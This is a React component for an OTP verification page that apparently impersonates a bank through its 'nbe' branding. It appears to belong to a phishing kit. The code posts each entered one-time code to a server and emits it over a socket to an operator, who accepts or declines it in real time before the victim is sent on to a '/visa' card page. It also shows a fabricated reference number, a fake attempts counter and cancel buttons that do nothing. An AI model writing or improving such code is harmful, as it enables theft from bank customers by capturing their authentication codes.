import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import axios from "axios";
import { IoClose } from "react-icons/io5";
import { TbEye, TbEyeOff } from "react-icons/tb";
import { generateReferenceNumber } from "../utils/generateReferenceNumber";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import LanguageToggle from "../components/nbe/LanguageToggle";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [resendMessage, setResendMessage] = useState("");
  const [referenceNumber] = useState(generateReferenceNumber);
  const orderId = sessionStorage.getItem("id");
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId,
    acceptEvent: "acceptOtp",
    declineEvent: "declineOtp",
    declineMessageKey: "declineOtp",
    onAccept: () => navigate("/visa"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    if (!orderId) return;

    setWaiting(true);
    try {
      await axios.post(api_route + "/otp/" + orderId, { otp }).then(() => {
        socket.emit("otp", { id: orderId, otp });
      });
    } catch (err) {
      setWaiting(false);
    }
  };

  const handleResendCode = async () => {
    if (!orderId) return;

    try {
      await axios.post(api_route + "/otp/resend/" + orderId);
      socket.emit("resendOtp", { id: orderId });
      setResendMessage(t("otpResentSuccess"));
    } catch (err) {
      console.log(err);
    }
  };

  return (
    <div className="fixed inset-0 z-40 bg-black/50 flex items-center justify-center px-4">
      {waiting && <ProcessingOverlay />}
      <div className="absolute top-4 end-4">
        <LanguageToggle compact />
      </div>

      <div
        className="relative max-w-lg w-full bg-white rounded-2xl p-5 shadow-xl"
        dir={dir}
      >
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-nbe-green font-semibold text-lg">
            {t("verification")}
          </h2>
          <button
            type="button"
            className="text-zinc-400 text-2xl p-1"
            aria-label="Close"
          >
            <IoClose />
          </button>
        </div>

        <form onSubmit={handleSubmit}>
          <div className="border border-zinc-300 rounded-xl p-4 mb-4">
            <h3 className="text-zinc-700 font-semibold text-sm mb-3">
              {t("oneTimeVerification")}
            </h3>

            <p className="text-nbe-green text-sm leading-relaxed mb-4">
              {t("otpInstructions")}
            </p>

            <label className="block text-nbe-green text-sm font-semibold mb-2">
              {t("verificationCode")}
            </label>
            <div className="flex items-center gap-2 mb-4">
              <input
                type={showOtp ? "text" : "password"}
                inputMode="numeric"
                maxLength={6}
                minLength={4}
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                className="w-24 py-2 px-3 rounded-lg border border-zinc-300 text-center"
                required
              />
              <button
                type="button"
                onClick={() => setShowOtp((prev) => !prev)}
                className="text-zinc-500 text-xl p-1"
                aria-label={showOtp ? "Hide code" : "Show code"}
              >
                {showOtp ? <TbEyeOff /> : <TbEye />}
              </button>
            </div>

            <button
              type="button"
              onClick={handleResendCode}
              disabled={!orderId}
              className="bg-nbe-green text-white text-xs uppercase px-4 py-2 rounded mb-4 disabled:opacity-70"
            >
              {t("resendCode")}
            </button>

            {resendMessage && (
              <p className="text-nbe-green text-sm mb-4">{resendMessage}</p>
            )}

            <p className="text-nbe-green text-sm font-semibold mb-1">
              {t("attemptsLeft")}
            </p>
            <p className="text-zinc-700 mb-3">5</p>

            <p className="text-nbe-green text-sm font-semibold mb-1">
              {t("referenceNumber")}
            </p>
            <div className="bg-zinc-100 rounded px-3 py-2 text-zinc-700 text-sm">
              {referenceNumber}
            </div>
          </div>

          <button
            type="submit"
            disabled={waiting || !orderId}
            className="w-full bg-nbe-green text-white font-semibold uppercase rounded-lg py-3 mb-2 disabled:opacity-70"
          >
            {t("submit")}
          </button>

          <button
            type="button"
            className="w-full bg-nbe-orange text-white font-semibold uppercase rounded-lg py-3"
          >
            {t("cancel")}
          </button>

          <DeclineError message={declineMessage} />
        </form>
      </div>
    </div>
  );
};

export default Otp;
